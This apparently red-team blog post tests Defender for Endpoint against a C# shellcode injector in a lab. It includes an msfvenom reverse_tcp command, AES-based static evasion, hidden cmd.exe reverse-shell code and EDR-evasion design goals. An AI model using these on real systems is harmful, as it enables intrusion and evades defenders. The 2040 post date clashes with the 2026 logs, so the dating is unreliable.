---
title: "API Series Part 3: The Network Is the Detection Surface"
date: 2040-06-25 00:00:00 +0000
categories: [Windows Internals, API Series]
tags: [windows, csharp, mde, edr, behavioural-detection, static-analysis, shellcode, encryption, meterpreter, red-team]
toc: true
---

## Overview

Parts 1 and 2 tested two assumptions about where detection fires.

Part 1 found that API imports alone do not trigger Defender's static engine. Part 2 found that on the tested MDE deployment, ntdll is not hooked — the injection APIs execute without interception.

Both results pointed to the same conclusion: detection is not firing where practitioners commonly expect it to.

This post tests the next assumption:

> If static analysis passes and the API calls complete uninterrupted, does the payload content cause the detection?

Three scenarios were tested using the same classic four-step injector, varying only the payload:

1. Raw msfvenom shellcode — no modification
2. AES-encrypted shellcode — calc.exe payload
3. AES-encrypted shellcode — meterpreter reverse_tcp stager

> All testing was performed in an authorised lab environment. Runtime results were observed on a Windows 11 system with an active Microsoft Defender for Endpoint sensor.

---

## The Test Setup

The injector used throughout this post is a classic four-step process injector written in C#:

1. `OpenProcess` — obtain a handle to the target (`notepad.exe`)
2. `VirtualAllocEx` — allocate RWX memory in the target process
3. `WriteProcessMemory` — write the payload into the allocated region
4. `CreateRemoteThread` — start execution at the written address

This is the same injection pattern tested across Parts 1 and 2. The payload content is the only variable.

---

## Test 1: Raw Msfvenom Shellcode

The first test establishes what static detection looks like when it fires.

A standard msfvenom payload was generated and embedded directly into the injector with no modification:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f csharp
```

ThreatCheck identified the threat without execution:

```
[+] Target file size: 6656 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x131C
00000034   5D 49 BE 77 73 32 5F 33  32 00 00 41 56 49 89 E6   ]I¾ws2_32··AVI?æ
00000050   49 BC 02 00 11 5C C0 A8  00 0A 41 54 49 89 E4 4C   I¼···\À¨··ATI?äL
```

The flagged bytes are in the meterpreter stager's winsock loader. Two signatures are visible in the dump:

- `77 73 32 5F 33 32` — the ASCII string `ws2_32`, the winsock DLL the stager loads at runtime
- `02 00 11 5C C0 A8 00 0A` — the encoded C2 address and port: `0x115C` = port 4444, `C0 A8 00 0A` = 192.168.0.10

The binary does not reach the target system. Static detection fires first.

![ThreatCheck output showing BasicInjector with raw msfvenom shellcode flagged at offset 0x131C](/assets/img/posts/api-series/threatcheck-basicinjector.png)

---

## Test 2: AES-Encrypted Shellcode — calc.exe

The second test replaces the raw payload with AES-encrypted shellcode. A calc.exe payload was generated, AES-128 encrypted, and the ciphertext embedded alongside the key and IV. The injector decrypts in memory before the four-step injection sequence.

ThreatCheck against the compiled binary:

```
[+] No threat found!
[*] Run time: 0.08s
```

![ThreatCheck output showing EncryptedInjector with AES-encrypted calc.exe shellcode — no threat found](/assets/img/posts/api-series/threatcheck-encryptedinjector-calc.png)

The binary was transferred to the MDE-protected system. No detection on disk arrival.

On execution — with notepad running as the target process — the injector ran without an alert. calc.exe launched.

No MDE alert at any stage: not on disk, not on execution, not during injection, not on the spawned process.

![Clean execution on the MDE-protected system — EncryptedInjector ran without alert and calc.exe launched](/assets/img/posts/api-series/mde-calc-clean.png)

**Finding:** AES encryption defeats static detection. The ciphertext produces no recognisable signature. The runtime behaviour — decryption, RWX allocation, remote thread creation — did not trigger an alert for a non-network payload.

---

## Test 3: AES-Encrypted Shellcode — Meterpreter Reverse TCP

The third test uses the same injector and encryption approach, with the shellcode replaced by a meterpreter `reverse_tcp` stager. The stager was AES-encrypted before embedding.

ThreatCheck:

```
[+] No threat found!
[*] Run time: 0.09s
```

![ThreatCheck output showing EncryptedInjector with AES-encrypted meterpreter stager — no threat found](/assets/img/posts/api-series/threatcheck-encryptedinjector-shell.png)

No detection on disk. With a Metasploit multi/handler listening on 192.168.0.69:4444, the injector was run on the MDE-protected system.

msfconsole output:

```
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Sending stage (230982 bytes) to 192.168.0.132
[*] Meterpreter session 1 opened (192.168.0.69:4444 -> 192.168.0.132:50635) at 2026-06-25 11:57:15 +0100

meterpreter >
[*] 192.168.0.132 - Meterpreter session 1 closed.  Reason: Died
```

The session opened. Shortly after session establishment, MDE terminated it.

Windows Defender alert:

```
Detected  Behavior:Win32/Meterpreter.C!sms
Status:   Removed
Details:  This program is dangerous and executes commands from an attacker.
Date:     25/06/2026 11:57

Affected items:
behaviour: process: Notepad.exe, pid:7648
```

![Windows Defender notification — Threat found popup during active meterpreter session](/assets/img/posts/api-series/mde-alert-notification.png)

![Windows Security Center — full alert detail showing Behavior:Win32/Meterpreter.C!sms detected in Notepad.exe, status Removed](/assets/img/posts/api-series/mde-alert-detail.png)

![msfconsole output — Meterpreter session 1 opened then closed, Reason: Died](/assets/img/posts/api-series/mde-session-died.png)

---

## What MDE Detected

The detection signature is `Behavior:Win32/Meterpreter.C!sms`. The `!sms` suffix denotes **suspicious memory string** — a behavioural detection based on content found in process memory at runtime, not on the binary on disk.

The sequence:

1. The encrypted stager executed in notepad's address space — **no detection**
2. The stager connected outbound to the Metasploit listener — **no detection**
3. Metasploit sent the meterpreter stage: 230,982 bytes of the meterpreter DLL, written into notepad's memory
4. MDE scanned notepad's memory, found meterpreter signatures in the stage — **detection fired, process terminated**

AES encryption protected the stager. It did not protect the stage. The meterpreter DLL was delivered by Metasploit over the network and loaded into memory unencrypted. The byte patterns that ThreatCheck identified in the raw binary in Test 1 were present in notepad's memory at runtime.

The stager bypassed static detection. The stage did not bypass runtime memory inspection.

---

## The Simple Reverse Shell

A separate test was run with a minimal custom reverse shell — a small C binary, no shellcode, no injection. The core of it is three operations:

```c
// 1. Create a TCP socket
SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

// 2. Connect to the C2 listener
connect(s, (struct sockaddr*)&sa, sizeof(sa));

// 3. Spawn cmd.exe with stdin/stdout/stderr all pointing at the socket
STARTUPINFOA si = {0};
si.cb          = sizeof(si);
si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;
si.hStdInput   = si.hStdOutput = si.hStdError = (HANDLE)s;

CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
```

There are no shellcode bytes. No injection APIs. No meterpreter patterns. From a static scanner's perspective there is nothing to flag — `WSASocketA`, `connect`, and `CreateProcessA` are standard Windows APIs used by legitimate software every day.

ThreatCheck against the compiled binary:

```
[+] No threat found!
```

It connected and remained active on the MDE-protected system. MDE detected it over time — the combination of an unknown binary making an outbound connection and immediately handing its I/O to `cmd.exe` produces a behavioural signal that accumulates into a detection.

The session provided no post-exploitation capability beyond a basic command prompt. No module loading, no file system primitives, no lateral movement.

The result is consistent with the encrypted injector tests: static analysis is bypassed by not using known-bad bytes. Runtime detection fires on what the process observably does — and a raw shell is both detectable and operationally limited.

---

## Summary

| Test | ThreatCheck | On-disk detection | Execution result |
|------|-------------|-------------------|-----------------|
| BasicInjector — raw msfvenom shellcode | **Flagged** (offset 0x131C) | N/A | N/A |
| EncryptedInjector — AES calc.exe | Clean | None | calc.exe launched, no alert |
| EncryptedInjector — AES meterpreter stager | Clean | None | Session opened; MDE detected meterpreter stage in memory, terminated |
| Simple reverse shell | Clean | None | Connected; detected over time via runtime behaviour |

Encryption solves the static detection problem. It does not solve the runtime inspection problem.

The stager was clean. The stage — 230KB of unencrypted meterpreter DLL written into a legitimate process — was not. MDE did not need to inspect the binary on disk. It inspected process memory at runtime and found what it was looking for there.

### What the results require

Each detection that fired points directly at a design requirement.

**The meterpreter stage was flagged in memory as `Behavior:Win32/Meterpreter.C!sms`.** The stage is a full DLL loaded into the target process. It carries identifiable strings and structures. Encrypting the stager does not help — the stage still has to run unencrypted. The fix is to never load a recognisable payload at all. That means writing a custom agent with no known byte patterns at any point in its runtime memory footprint.

**The injector allocated RWX memory.** `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` is a strong behavioural signal — memory that is written and then executed is a classic injection pattern. An agent built to avoid this uses a write-then-protect model: allocate RW, write the payload, then change the protection to RX before execution. The allocation is never simultaneously writable and executable.

**The reverse shell was caught on behaviour, not bytes.** An unknown binary connecting outbound and immediately attaching `cmd.exe` to that socket is a recognisable pattern regardless of what the binary contains. An agent that blends in needs to look like software that already exists on the system — a known identity, a plausible network profile, traffic that matches what a legitimate application produces.

These three constraints — no recognisable in-memory signature, no RWX memory, communication that masquerades as a known application — are the design requirements that drive what gets built in Part 4.

---

## What Comes Next

Part 4 covers the design and construction of a custom C2 agent built to address what the research found across Parts 1 through 3: a process that passes static analysis, does not load a known payload into memory at runtime, and communicates over a channel that does not match known C2 patterns.

* **[API Series Part 4: Building a Custom C2 Agent — Design Decisions From the Research](/posts/api-series-custom-agent/)** *(coming soon)*

---

## References

* [MITRE ATT&CK T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
* [MITRE ATT&CK T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
* [msfvenom — Metasploit Framework](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
* [ThreatCheck — GitHub](https://github.com/rasta-mouse/ThreatCheck)

**Related posts:**
- [API Series Part 1: Do Your API Imports Get You Caught? Testing the Static Assumption](/posts/api-series-static-detection/)
- [API Series Part 2: The Windows API Call Stack and Where EDRs Hook](/posts/api-series-call-stack/)

